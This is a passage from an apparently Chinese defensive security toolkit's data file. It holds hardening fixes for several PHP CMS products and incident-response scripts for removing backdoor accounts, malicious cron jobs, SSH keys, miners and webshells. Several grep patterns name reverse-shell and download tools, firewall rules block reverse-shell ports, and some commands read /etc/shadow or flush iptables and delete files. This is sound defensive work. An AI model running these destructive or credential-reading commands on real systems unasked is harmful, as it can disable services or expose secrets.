    affected: 'ThinkPHP 6.0.0 ~ 6.0.1',
    desc: 'Session ID 可控导致任意文件读取+反序列化',
    fix: `# ===== 方案1: 升级 (推荐) =====
composer update topthink/framework  # 至少 6.0.12+ / 6.1+

# ===== 方案2: config/session.php 强化 =====
<?php
return [
    'id'             => '',                 // SessionId
    'var_session_id' => '',                 // 禁用 URL 传 session_id
    'name'           => 'PHPSESSID',
    'serialize'      => ['serialize','unserialize'],  // 显式指定, 不要用默认
    'expire'         => 1440,
    'secure'         => true,
    'httponly'       => true,
    'samesite'       => 'Lax',
];

# ===== 方案3: 验证 Session ID 格式 =====
# 中间件中强制 session id 为 32 位 hex:
if (!preg_match('/^[a-z0-9]{32}$/', $sessionId)) abort(400);

# ===== 方案4: 关闭 Debug + Trace =====
# .env:
APP_DEBUG = false

# ===== 方案5: 删除 runtime 目录外的可写目录 =====
find /var/www/html -type d -perm -o+w 2>/dev/null`,
    oneliner: `find / -path '*/topthink/framework/src/think/App.php' 2>/dev/null; grep -rn 'VERSION' /var/www -l 2>/dev/null | xargs grep "'6\\." 2>/dev/null | head`,
    verify: `# 确认版本 >= 6.0.12: grep -rn "const VERSION" vendor/topthink/framework/src/think/App.php`,
    tags: ['thinkphp', 'tp6', 'session', 'rce', 'php', 'cms'],
  },
  {
    id: 'cms-discuz', lang: 'CMS', vuln: 'Discuz!',
    title: 'Discuz! X3.x 加固 (authkey/后台)',
    affected: 'Discuz! X3.2 ~ X3.4',
    desc: '默认 authkey 预测、后台弱口令、插件 RCE',
    fix: `# ===== 1. 更换 authkey =====
# 编辑 config/config_global.php:
$_config['security']['authkey'] = '$(openssl rand -hex 32)';
# config/config_ucenter.php:
define('UC_KEY', '$(openssl rand -hex 16)');

# ===== 2. 删除安装目录 =====
rm -rf /var/www/html/install/

# ===== 3. 关闭前台注册 / 启用验证码 =====
# UCenter 后台: 用户 -> 注册设置 -> 关闭或需审核

# ===== 4. 限制后台访问 IP =====
# Nginx 在 admin.php 前限制:
location ~* /admin\\.php {
    allow YOUR_ADMIN_IP;
    deny all;
    fastcgi_pass ...;
}

# ===== 5. 删除多余接口 =====
rm -f /var/www/html/api/uc.php  # 如非必要
rm -f /var/www/html/api/manyou/my.php

# ===== 6. 升级插件 / 删除风险插件 =====
# Discuz 后台 -> 应用 -> 插件 -> 卸载未使用插件

# ===== 7. 数据库权限降权 =====
# MySQL 为 Discuz 单独账号, 仅授予 ux_discuz.* 权限, 不给 FILE/SUPER

# ===== 8. 关键目录禁止 PHP 执行 =====
location ~* ^/(data|uc_client|uc_server|plugin)/.*\\.(php|php\\.)\\$ {
    deny all;
    return 403;
}`,
    oneliner: `grep -n 'authkey\\|UC_KEY' /var/www/html/config/config_*.php 2>/dev/null | head; ls /var/www/html/install 2>/dev/null && echo 'INSTALL DIR EXISTS!'`,
    verify: `curl -sI http://localhost/install/  # 应 404; 确认 authkey 非默认`,
    tags: ['discuz', 'authkey', 'cms', 'php', '加固'],
  },
  {
    id: 'cms-phpmyadmin', lang: 'CMS', vuln: 'phpMyAdmin',
    title: 'phpMyAdmin 加固',
    desc: '限制访问 + 强制双重认证, 避免 RCE/爆破',
    fix: `# ===== 1. 删除安装/测试目录 =====
rm -rf /usr/share/phpmyadmin/setup/
rm -rf /usr/share/phpmyadmin/test/
rm -rf /usr/share/phpmyadmin/examples/

# ===== 2. Nginx 限制访问 IP =====
location /phpmyadmin/ {
    allow YOUR_OFFICE_IP;
    allow 127.0.0.1;
    deny all;
    ...
}

# ===== 3. config.inc.php 加固 =====
<?php
$cfg['blowfish_secret'] = '<32字符随机>';
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['LoginCookieValidity'] = 900;          // 15分钟过期
$cfg['LoginCookieRecall'] = false;
$cfg['ShowServerInfo'] = false;
$cfg['ShowPhpInfo'] = false;
$cfg['ShowChgPassword'] = false;
$cfg['AllowArbitraryServer'] = false;
$cfg['Servers'][$i]['hide_db'] = '^(mysql|information_schema|performance_schema|sys)$';
# 禁用执行 SQL (只允许只读):
# $cfg['Servers'][$i]['only_db'] = ['your_app_db'];

# ===== 4. 加 HTTP Basic 第二层密码 =====
htpasswd -c /etc/nginx/.pma_htpasswd admin
# Nginx:
location /phpmyadmin/ {
    auth_basic "pma";
    auth_basic_user_file /etc/nginx/.pma_htpasswd;
    ...
}

# ===== 5. 升级到最新版 =====
# https://www.phpmyadmin.net/downloads/`,
    oneliner: `find / -name 'phpmyadmin' -type d 2>/dev/null | head; ls /usr/share/phpmyadmin/setup 2>/dev/null && echo '[!] setup dir exists'`,
    verify: `curl -sI http://localhost/phpmyadmin/setup/ | head -1  # 应 403/404`,
    tags: ['phpmyadmin', 'pma', 'cms', 'php', '加固'],
  },
  {
    id: 'cms-dedecms', lang: 'CMS', vuln: '织梦DedeCMS',
    title: 'DedeCMS 织梦加固 (install/member/plus)',
    affected: 'DedeCMS V5.7 及所有派生版本',
    desc: '历史 RCE 大户, 务必删除 install、member、plus 中不用的接口',
    fix: `# ===== 1. 删除 install 目录 (必做) =====
rm -rf /var/www/html/install/

# ===== 2. 关闭会员功能 (如不需要) =====
# 后台 -> 系统 -> 系统基本参数 -> 会员设置
# 'cfg_mb_open' => 'N'
# 或直接:
rm -rf /var/www/html/member/

# ===== 3. 删除高危 plus 脚本 =====
# plus 目录下常见漏洞文件
cd /var/www/html/plus
rm -f ad_js.php car.php carbuyaction.php comments_frame.php \\
      count.php download.php erraddsave.php feedback_ajax.php \\
      flink_add.php guestbook.php heightsearch.php mytag_js.php \\
      recommend.php search.php showphoto.php sitemap.php \\
      vote.php wapindex.php

# ===== 4. data 目录禁止 PHP 执行 =====
# Nginx:
location ~* ^/(data|templets|uploads|plus/)/.*\\.(php|phtml|php5|pht)$ {
    deny all; return 403;
}
# Apache .htaccess in data/:
<FilesMatch "\\.(php|phtml|php5|pht)$">
    Require all denied
</FilesMatch>

# ===== 5. 后台目录重命名 =====
mv /var/www/html/dede /var/www/html/dede_$(openssl rand -hex 4)

# ===== 6. 修改默认管理员 admin =====
# 登录后台 -> 系统 -> 系统用户 -> 改 admin 密码并改名

# ===== 7. 打最新补丁 =====
# https://www.dedecms.com/pl/`,
    oneliner: `ls /var/www/html/install 2>/dev/null && echo '[!] install dir exists'; find /var/www/html/plus -name '*.php' 2>/dev/null | wc -l`,
    verify: `curl -sI http://localhost/install/  # 应 404; curl -sI http://localhost/dede/  # 应 404 (已重命名)`,
    tags: ['dedecms', '织梦', 'cms', 'php'],
  },
  {
    id: 'cms-tongda', lang: 'CMS', vuln: '通达OA',
    title: '通达 OA getshell 修复',
    cve: 'CNVD-2020-58823 等多个版本 RCE',
    affected: '通达 OA 11.x 及以下',
    desc: '未授权上传 + 文件包含组合 getshell, 修复需删接口+打补丁',
    fix: `# ===== 1. 升级到最新版 (通过 office.tongda2000.com) =====

# ===== 2. 删除/禁用高危接口 =====
# 任意文件上传接口:
rm -f webroot/ispirit/im/upload.php
rm -f webroot/ispirit/interface/gateway.php     # 旧版
# 若需保留, 加访问限制

# ===== 3. 重命名/删除历史后门接口 =====
find webroot -name 'auth.inc.php' -exec mv {} {}.disabled \\;

# ===== 4. Nginx/IIS 限制危险路径 =====
# Nginx:
location ~* /(general/.*|mobile/.*|ispirit/(im/upload|interface/gateway))\\.php$ {
    # 需要时仅允许内网 IP
    allow 192.168.0.0/16;
    allow 10.0.0.0/8;
    deny all;
}

# ===== 5. 关闭 PHP 在 attach/uploads 执行 =====
location ~* ^/(attach|attachment|uploads|im)/.*\\.(php|phtml)$ {
    deny all; return 403;
}

# ===== 6. 修改默认 admin 密码 + 清空演示账号 =====
# 登录后台, 用户管理删除 demo/test 账号

# ===== 7. 备份 webroot 目录 =====
tar czf /root/tongda_backup_$(date +%s).tar.gz webroot`,
    oneliner: `find / -path '*ispirit/im/upload.php' 2>/dev/null; find / -name 'auth.inc.php' -path '*tongda*' 2>/dev/null`,
    verify: `curl -sI http://localhost/ispirit/im/upload.php  # 应 403/404`,
    tags: ['tongdaoa', '通达oa', 'cms', 'php'],
  },
  {
    id: 'cms-laravel-debug', lang: 'CMS', vuln: 'Laravel Debug',
    title: 'Laravel Debug 模式 RCE (CVE-2021-3129)',
    cve: 'CVE-2021-3129',
    affected: 'Laravel < 8.4.2 + ignition < 2.5.2 + APP_DEBUG=true',
    desc: 'ignition 调试页反序列化 file_get_contents phar:// RCE',
    fix: `# ===== 方案1: 关闭 Debug (必做) =====
# .env:
APP_DEBUG=false
APP_ENV=production

# 清缓存:
php artisan config:cache
php artisan route:cache

# ===== 方案2: 升级 laravel/framework + facade/ignition =====
composer update laravel/framework facade/ignition
# 或删除 ignition:
composer remove facade/ignition

# ===== 方案3: 禁用 phar:// =====
# php.ini:
disable_functions = file_get_contents,file_put_contents,fopen,popen,pcntl_exec,passthru,...
# 或至少禁用危险函数
phar.readonly = On

# ===== 方案4: 删除 _ignition 路由 =====
# 编辑 config/app.php, 移除 IgnitionServiceProvider
'providers' => [
    // Facade\\Ignition\\IgnitionServiceProvider::class,  // 注释掉
]

# ===== 方案5: 兜底 Web 层拦截 =====
# Nginx:
location ~ /_ignition { return 404; }`,
    oneliner: `grep -E '^APP_DEBUG|^APP_ENV' /var/www/*/.env 2>/dev/null; curl -sI http://localhost/_ignition/execute-solution | head -1`,
    verify: `curl -sI http://localhost/_ignition/execute-solution  # 应 404`,
    tags: ['laravel', 'debug', 'ignition', 'rce', 'php', 'cms', 'cve-2021-3129'],
  },
  {
    id: 'cms-wordpress', lang: 'CMS', vuln: 'WordPress',
    title: 'WordPress 基础加固 (xmlrpc/REST/插件)',
    desc: '比赛最常见 CMS, 默认配置问题较多',
    fix: `# ===== 1. 禁用 xmlrpc.php (扫爆炸点) =====
# Nginx:
location = /xmlrpc.php { deny all; return 403; }

# 或 .htaccess:
<Files xmlrpc.php>
    Require all denied
</Files>

# 插件方式: Disable XML-RPC

# ===== 2. 限制 wp-admin / wp-login =====
location ~ ^/(wp-admin|wp-login\\.php) {
    allow YOUR_IP;
    allow 127.0.0.1;
    deny all;
    # 需要的话: auth_basic "admin"; ...
}

# ===== 3. 禁止用户名枚举 =====
# functions.php 或 wp-config.php:
if(!empty($_REQUEST['author'])) { die(); }
remove_action('wp_head', 'wp_oembed_add_discovery_links');

# ===== 4. wp-config.php 加固 =====
define('DISALLOW_FILE_EDIT', true);   // 禁用后台编辑插件/主题
define('DISALLOW_FILE_MODS', true);   // 禁用后台安装插件
define('FORCE_SSL_ADMIN', true);
define('WP_DEBUG', false);
define('WP_DEBUG_DISPLAY', false);
# 新盐值 (https://api.wordpress.org/secret-key/1.1/salt/)

# ===== 5. 关闭 REST API 未授权列用户 =====
# functions.php:
add_filter('rest_endpoints', function($ep){
    if (isset($ep['/wp/v2/users'])) unset($ep['/wp/v2/users']);
    if (isset($ep['/wp/v2/users/(?P<id>[\\d]+)'])) unset($ep['/wp/v2/users/(?P<id>[\\d]+)']);
    return $ep;
});

# ===== 6. uploads 禁止 PHP 执行 =====
location ~* ^/wp-content/uploads/.*\\.(php|phtml|php5|pht)$ {
    deny all; return 403;
}

# ===== 7. 删除默认 admin 账号 + 改前缀 =====
# wp-config.php: $table_prefix = 'wp_' 改为随机前缀 (新装时)

# ===== 8. 升级核心 + 插件 + 主题 =====
wp core update; wp plugin update --all; wp theme update --all`,
    oneliner: `curl -sI http://localhost/xmlrpc.php; curl -s 'http://localhost/wp-json/wp/v2/users' | head -c 300`,
    verify: `curl -sI http://localhost/xmlrpc.php | head -1  # 应 403; curl -s http://localhost/wp-json/wp/v2/users  # 应 401/空`,
    tags: ['wordpress', 'wp', 'xmlrpc', 'cms', 'php'],
  },
];

// ═══════════════════════════════════════
// 应急响应 / 已有后门清理 (防御赛中盘)
// ═══════════════════════════════════════
const emergency: SecFixSnippet[] = [
  {
    id: 'em-user-clean', lang: '应急', vuln: '恶意用户清理',
    title: '恶意用户 / 后门账号清理',
    desc: '检测并清除异常用户、UID=0 账号、空密码账号',
    fix: `# ===== 1. 列出所有 UID=0 账号 (应只有 root) =====
awk -F: '$3==0{print NR": "$0}' /etc/passwd

# ===== 2. 列出空密码账号 =====
awk -F: '($2==""){print $1}' /etc/shadow

# ===== 3. 列出可登录 shell 的账号 =====
awk -F: '$7 !~ /(nologin|false)$/{print $1":"$3":"$7}' /etc/passwd

# ===== 4. 查看最近创建的账号 =====
stat /etc/passwd /etc/shadow
find /home -maxdepth 1 -type d -mtime -7 2>/dev/null

# ===== 5. 删除恶意账号 =====
# 先锁定 (保留痕迹):
usermod -L MALICIOUS_USER
usermod -s /sbin/nologin MALICIOUS_USER
passwd -l MALICIOUS_USER

# 确认后完全删除 (连家目录):
userdel -r MALICIOUS_USER

# ===== 6. 删除 sudoers 中的异常条目 =====
visudo  # 手动检查
grep -v '^#' /etc/sudoers /etc/sudoers.d/* 2>/dev/null
# 删除可疑 NOPASSWD 和非标准账号:
sed -i '/^MALICIOUS_USER/d' /etc/sudoers

# ===== 7. 清理 wheel / sudo / admin 组 =====
grep -E '^(wheel|sudo|admin):' /etc/group
gpasswd -d MALICIOUS_USER wheel 2>/dev/null
gpasswd -d MALICIOUS_USER sudo 2>/dev/null

# ===== 8. 锁定 passwd/shadow (修改完成后) =====
chattr +i /etc/passwd /etc/shadow /etc/group /etc/sudoers`,
    oneliner: `awk -F: '$3==0{print}' /etc/passwd; awk -F: '($2==""){print $1}' /etc/shadow; grep -vE '^#|^$' /etc/sudoers`,
    verify: `awk -F: '$3==0{c++}END{print c" UID=0 accounts"}' /etc/passwd  # 应为 1`,
    tags: ['应急', 'user', '后门', 'uid0', 'sudoers'],
  },
  {
    id: 'em-cron-clean', lang: '应急', vuln: '恶意计划任务清理',
    title: '恶意 Crontab / At / Systemd Timer 清理',
    desc: '清除反弹/下载类恶意计划任务',
    fix: `# ===== 1. 列出所有用户 crontab =====
for u in $(cut -d: -f1 /etc/passwd); do
  echo "===== $u ====="
  crontab -l -u "$u" 2>/dev/null
done

# ===== 2. 系统级 crontab =====
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/cron.d/* 2>/dev/null
cat /var/spool/cron/* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null

# ===== 3. 识别可疑模式 (下载/反弹/挖矿) =====
grep -rE 'curl|wget|base64|/dev/tcp|bash -i|nc -e|python.*-c|perl.*-e|xmrig|minerd|kdevtmpfsi|kinsing' \\
  /etc/crontab /etc/cron.*/* /var/spool/cron/* /var/spool/cron/crontabs/* 2>/dev/null

# ===== 4. 清空恶意 crontab =====
# 备份当前 crontab
for u in $(cut -d: -f1 /etc/passwd); do
  crontab -l -u "$u" 2>/dev/null > /tmp/cron_bak_$u
done

# 删除异常用户 crontab
crontab -r -u MALICIOUS_USER 2>/dev/null

# 清空 /etc/cron.d 下异常文件
ls -la /etc/cron.d/  # 手动检查后:
# rm /etc/cron.d/SUSPICIOUS_FILE

# ===== 5. at 任务 =====
atq  # 列出
# atrm JOB_ID  # 删除

# ===== 6. systemd Timer =====
systemctl list-timers --all
systemctl list-unit-files --type=timer
# 禁用可疑 timer:
# systemctl disable --now SUSPICIOUS.timer

# ===== 7. 锁定 cron 目录 (避免再被写入) =====
chattr +i /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily
chattr +i /var/spool/cron -R 2>/dev/null`,
    oneliner: `grep -rE 'curl|wget|base64|/dev/tcp|bash -i|nc -e|xmrig|kdevtmpfsi' /etc/crontab /etc/cron.*/* /var/spool/cron/* 2>/dev/null; systemctl list-timers --all | head -20`,
    verify: `for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done | grep -vE '^#|^$'  # 确认无异常`,
    tags: ['应急', 'cron', 'crontab', 'at', 'systemd', 'timer', '持久化'],
  },
  {
    id: 'em-ssh-keys', lang: '应急', vuln: '恶意SSH公钥清理',
    title: 'authorized_keys / ssh_config 清理',
    desc: '查找所有被写入的 SSH 公钥并清理',
    fix: `# ===== 1. 查找所有 authorized_keys =====
find / -name 'authorized_keys' 2>/dev/null -exec echo "=== {} ===" \\; -exec cat {} \\;
find / -name 'authorized_keys2' 2>/dev/null

# ===== 2. 查看时间, 判断是否是比赛中新增 =====
find / -name 'authorized_keys' -mtime -1 2>/dev/null -exec ls -la {} \\;

# ===== 3. 备份后清空 (谨慎: 可能锁死合法用户) =====
find / -name 'authorized_keys' 2>/dev/null -exec cp {} {}.bak.$(date +%s) \\; -exec truncate -s 0 {} \\;

# 仅保留你自己的公钥:
echo 'ssh-rsa YOUR_OWN_KEY you@host' > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chown root:root /root/.ssh/authorized_keys

# ===== 4. 检查所有用户的 .ssh 目录 =====
for d in /root/.ssh /home/*/.ssh; do
  [ -d "$d" ] && echo "=== $d ===" && ls -la "$d"
done

# ===== 5. 检查 sshd_config 后门 =====
# 常见: AuthorizedKeysFile /tmp/ak, PermitRootLogin yes, PasswordAuthentication yes
grep -E '^AuthorizedKeysFile|^PermitRootLogin|^PasswordAuthentication|^PermitEmptyPasswords' /etc/ssh/sshd_config

# 恢复安全默认:
sed -i 's|^AuthorizedKeysFile.*|AuthorizedKeysFile .ssh/authorized_keys|' /etc/ssh/sshd_config
sed -i 's|^PermitRootLogin.*|PermitRootLogin prohibit-password|' /etc/ssh/sshd_config
sed -i 's|^PasswordAuthentication.*|PasswordAuthentication no|' /etc/ssh/sshd_config
sed -i 's|^PermitEmptyPasswords.*|PermitEmptyPasswords no|' /etc/ssh/sshd_config
systemctl restart sshd

# ===== 6. 锁定 .ssh 目录 =====
chattr +i /root/.ssh/authorized_keys
# 注意: +i 后无法再加 key, 比赛结束或需改时 chattr -i

# ===== 7. 检查 known_hosts 反查攻击者 =====
find / -name 'known_hosts' 2>/dev/null -exec cat {} \\; 2>/dev/null | sort -u`,
    oneliner: `find / -name 'authorized_keys*' 2>/dev/null -exec echo '=== {} ===' \\; -exec cat {} \\; 2>/dev/null`,
    verify: `wc -l /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null  # 确认只有已知公钥`,
    tags: ['应急', 'ssh', 'authorized_keys', '公钥', '持久化'],
  },
  {
    id: 'em-process-hunt', lang: '应急', vuln: '恶意进程清理',
    title: '恶意进程查杀 (挖矿/反弹/C2)',
    desc: '识别高 CPU / 隐藏进程 / 网络外连并清杀',
    fix: `# ===== 1. CPU Top (挖矿特征) =====
ps aux --sort=-%cpu | head -10
top -bn1 -o %CPU | head -20

# 常见挖矿进程名:
ps aux | grep -iE 'xmrig|minerd|kdevtmpfsi|kinsing|dbused|khugepageds|watchbog|mimikatz|crypto|monero'

# ===== 2. 进程-文件-网络关联 =====
for pid in $(ss -antlp | grep ESTAB | awk -F'pid=' '{print $2}' | cut -d, -f1 | sort -u); do
  echo "===== PID=$pid ====="
  ls -la /proc/$pid/exe 2>/dev/null
  cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' '; echo
  readlink /proc/$pid/cwd
done

# ===== 3. 隐藏进程 (ps 看不到但 /proc 有) =====
ls /proc | grep -E '^[0-9]+$' | while read pid; do
  ps -p $pid > /dev/null 2>&1 || echo "[HIDDEN] PID=$pid $(cat /proc/$pid/comm 2>/dev/null)"
done

# ===== 4. 对比 proc 和 ps =====
diff <(ls /proc | grep -E '^[0-9]+$' | sort) <(ps -ef | awk 'NR>1{print $2}' | sort -n)

# ===== 5. 查看父进程 (溯源) =====
ps -eo pid,ppid,user,cmd --forest

# ===== 6. 杀进程 (直接 kill 再删文件, 避免 systemd/cron 复活) =====
PID=MALICIOUS_PID
EXE=$(readlink /proc/$PID/exe)
CWD=$(readlink /proc/$PID/cwd)
kill -STOP $PID                 # 先暂停, 防止 fork
# 找出父进程和计划任务再统一处理
pstree -p $PID
# 彻底杀:
kill -9 $PID
[ -f "$EXE" ] && chattr -i "$EXE" 2>/dev/null; rm -f "$EXE"

# ===== 7. 防复活 =====
# 如果杀掉后还在复活: 大概率由 crontab / systemd / rc.local / .bashrc 拉起
# 先看 em-cron-clean / em-persist-check`,
    oneliner: `ps aux --sort=-%cpu | head -10; ls /proc | grep -E '^[0-9]+$' | while read p; do ps -p $p >/dev/null 2>&1 || echo "HIDDEN $p $(cat /proc/$p/comm 2>/dev/null)"; done`,
    verify: `ps aux --sort=-%cpu | awk 'NR==2{if($3+0 < 30)print "OK"; else print "STILL_HIGH: "$0}'`,
    tags: ['应急', '进程', 'process', '挖矿', 'miner', 'xmrig'],
  },
  {
    id: 'em-persist-check', lang: '应急', vuln: '持久化全面排查',
    title: '持久化后门全面排查 (比赛必跑)',
    desc: '一次性排查常见 10+ 种 Linux 持久化机制',
    fix: `#!/bin/bash
# 持久化后门排查 - 比赛一条龙
echo "===== 1. Crontab ====="
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done
cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -vE '^#|^$'

echo "===== 2. Systemd Services & Timers ====="
systemctl list-unit-files --state=enabled --type=service
systemctl list-timers --all
find /etc/systemd/system /usr/lib/systemd/system -mmin -1440 -name '*.service' 2>/dev/null

echo "===== 3. rc.local / init.d ====="
cat /etc/rc.local 2>/dev/null
ls -la /etc/init.d/

echo "===== 4. Profile / bashrc / bash_profile ====="
for f in /etc/profile /etc/bashrc /etc/bash.bashrc /etc/profile.d/*.sh \\
         /root/.bashrc /root/.bash_profile /root/.profile /root/.bash_login \\
         /home/*/.bashrc /home/*/.bash_profile /home/*/.profile; do
  [ -f "$f" ] && grep -EHn 'bash -i|/dev/tcp|nc -e|curl.*\\|sh|wget.*\\|sh|base64 -d|eval.*base64|python.*-c' "$f" 2>/dev/null
done

echo "===== 5. SSH 公钥 ====="
find / -name 'authorized_keys*' 2>/dev/null -exec cat {} \\;

echo "===== 6. LD_PRELOAD 劫持 ====="
env | grep LD_PRELOAD
cat /etc/ld.so.preload 2>/dev/null

echo "===== 7. SUID 文件 ====="
find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(usr|bin|sbin)/(bin|sbin)?/?(su|sudo|ping|mount|umount|passwd|chsh|chfn|newgrp|gpasswd|pkexec|crontab)$' | head

echo "===== 8. PAM 模块 ====="
find /lib /lib64 /usr/lib /usr/lib64 -name 'pam_*.so' -mmin -1440 2>/dev/null

echo "===== 9. 内核模块 ====="
lsmod | awk 'NR>1{print $1}'  # 关注非发行版默认模块
find /lib/modules -name '*.ko' -mmin -1440 2>/dev/null

echo "===== 10. 系统命令篡改 ====="
# RPM 系:
rpm -Va 2>/dev/null | grep '^..5' | head -20
# Deb 系:
dpkg -V 2>/dev/null | grep -v '^??5' | head -20

echo "===== 11. 异常 at 任务 ====="
atq

echo "===== 12. inetd/xinetd ====="
cat /etc/inetd.conf 2>/dev/null
ls /etc/xinetd.d/ 2>/dev/null

echo "===== 13. 用户级自启动 ====="
ls /home/*/.config/autostart/ 2>/dev/null
ls /root/.config/autostart/ 2>/dev/null`,
    oneliner: `bash -c 'for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done; find / -name authorized_keys 2>/dev/null -exec cat {} \\; ; env | grep LD_PRELOAD; find / -perm -4000 -mmin -1440 2>/dev/null'`,
    verify: `# 排查完后, 把这个脚本命名为 /root/persist_check.sh, 隔天对比一次输出`,
    tags: ['应急', '持久化', 'persist', 'cron', 'systemd', 'ld_preload', 'suid', 'pam'],
  },
  {
    id: 'em-network-lock', lang: '应急', vuln: '网络封堵',
    title: '紧急网络封堵 / 反弹 Shell 阻断',
    desc: '一键封禁外连, 只保留必要端口, 切断反弹通道',
    fix: `# ===== 1. 备份当前 iptables 规则 =====
iptables-save > /root/iptables_$(date +%s).bak
ip6tables-save > /root/ip6tables_$(date +%s).bak 2>/dev/null

# ===== 2. 紧急模式: 只允许 22/80/443 + 已建连接 =====
iptables -F
iptables -X
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT           # 入站严 出站宽 (比赛赛制可调)

iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT
# 业务端口按需加:
# iptables -A INPUT -p tcp --dport 3306 -s 10.0.0.0/8 -j ACCEPT

# ===== 3. 阻断反弹 Shell 常用端口 (OUTPUT) =====
# 反弹到互联网常用 4444/5555/6666/7777/8888/9999/1337
iptables -I OUTPUT -p tcp -m multiport --dports 4444,5555,6666,7777,8888,9999,1337,31337 -j DROP

# ===== 4. 只允许出到可信 IP (比赛严格模式) =====
# iptables -P OUTPUT DROP
# iptables -A OUTPUT -o lo -j ACCEPT
# iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
# iptables -A OUTPUT -d UPDATE_SERVER_IP -p tcp --dport 443 -j ACCEPT

# ===== 5. 封禁已识别攻击 IP =====
for ip in ATTACKER_IP_1 ATTACKER_IP_2; do
  iptables -I INPUT -s "$ip" -j DROP
done

# ===== 6. 持久化 =====
# CentOS/RHEL:
iptables-save > /etc/sysconfig/iptables
# Debian/Ubuntu (需 iptables-persistent):
iptables-save > /etc/iptables/rules.v4

# ===== 7. 切断当前可疑 TCP 会话 =====
# 需要 conntrack-tools
ss -K dst ATTACKER_IP 2>/dev/null
conntrack -D -s ATTACKER_IP 2>/dev/null

# ===== 8. 禁用常见反弹方式依赖 =====
# /dev/tcp: 通过出站 DROP 封禁 4444 等端口解决
# nc -e: 部分发行版默认不带 -e, 可 check: nc -h 2>&1 | grep -E '\\-e '
# bash -i: 无法禁用, 但 OUTPUT 策略可切断

# ===== 9. 记录拒绝日志 =====
iptables -I INPUT -m limit --limit 5/min -j LOG --log-prefix 'IPTables-Drop: ' --log-level 4`,
    oneliner: `iptables-save > /root/iptables.bak; iptables -F INPUT; iptables -P INPUT DROP; iptables -A INPUT -i lo -j ACCEPT; iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT; iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT; iptables -I OUTPUT -p tcp -m multiport --dports 4444,5555,6666,7777,8888,9999 -j DROP`,
    verify: `iptables -L INPUT -n -v | head -20; netstat -antlp | grep ESTAB | head -5  # 观察已建连接`,
    tags: ['应急', 'iptables', '防火墙', '反弹shell', '封堵', 'network'],
  },
  {
    id: 'em-memshell', lang: '应急', vuln: 'Java内存马清理',
    title: 'Java 内存马 (Filter/Servlet) 排查',
    desc: 'Tomcat Filter 型 / Servlet 型 / Listener 型内存马检测',
    fix: `# ===== 1. 快速定位 (文件对比) =====
# 内存马特征: 文件系统没有对应 class 但 HTTP 可访问
# 对比当前 web 目录 vs 备份
diff -rq /var/www/webapps /var/www/webapps.bak 2>/dev/null | head

# ===== 2. Arthas 运行时排查 (强烈推荐) =====
# 下载 Arthas (如果现场有):
# curl -O https://arthas.aliyun.com/arthas-boot.jar
java -jar arthas-boot.jar

# 在 arthas 中:
# - 查看所有 Filter
sc -d javax.servlet.Filter
sc -d '*Filter*' -f              # 列字段 (恶意 filter 常无对应 class 文件)

# - 查看加载的 Servlet
sc -d javax.servlet.Servlet

# - 查看可疑类的加载源
classloader -c CLASSLOADER_HASH
jad --source-only com.evil.MaliciousFilter > /tmp/dump.java

# - dump 出可疑类
dump -d /tmp/dump com.evil.MaliciousFilter

# ===== 3. 通过 JVM 工具 =====
# 找 Tomcat PID
PID=$(jps -l | grep -i tomcat | awk '{print $1}')

# 获取加载类列表, 找与磁盘不对应的
jmap -histo $PID | head -50
jcmd $PID GC.class_histogram | head -50

# ===== 4. 无 Arthas 时的土办法 =====
# 看 Tomcat work/ 目录是否被写入新文件
find /usr/local/tomcat*/work -mmin -120 -type f 2>/dev/null

# 看应用 classes 目录
find /var/www/webapps/*/WEB-INF/classes -type f -mmin -120 2>/dev/null

# ===== 5. 重启 Tomcat (最终手段) =====
# 内存马多数无落地, 重启后消失 (但再被攻击者通过同一漏洞 getshell 会再植入)
# 因此: 先补漏洞, 再重启
systemctl restart tomcat

# ===== 6. 防再次植入 =====
# - 禁用危险 API (DisallowedFields for Spring4Shell)
# - JDK 升级
# - Tomcat manager / host-manager 关闭
rm -rf /usr/local/tomcat/webapps/{manager,host-manager,docs,examples}`,
    oneliner: `ps -ef | grep -iE 'java|tomcat' | grep -v grep | awk '{print $2}' | xargs -I{} jcmd {} VM.uptime 2>/dev/null; find /usr/local/tomcat*/work /var/www/webapps/*/WEB-INF/classes -mmin -120 -type f 2>/dev/null`,
    verify: `curl -sI http://localhost:8080/ -H 'X-Not-Memshell: check' | head -20  # 确认无异常 Header; 需 Arthas 复查 sc -d '*Filter*'`,
    tags: ['应急', '内存马', 'memshell', 'tomcat', 'java', 'filter'],
  },
  {
    id: 'em-webshell-hunt', lang: '应急', vuln: 'WebShell 排查',
    title: 'WebShell 精准查杀',
    desc: '按特征 + 时间 + 权限 + 熵值综合排查',
    fix: `# ===== 1. 时间维度 (比赛常用) =====
# 最近 60 分钟新增或修改的 Web 文件
find /var/www -type f \\( -name '*.php' -o -name '*.jsp' -o -name '*.asp*' \\) -mmin -60

# 最近 7 天
find /var/www -type f \\( -name '*.php' -o -name '*.jsp' -o -name '*.asp*' \\) -mtime -7

# ===== 2. 特征匹配 (PHP) =====
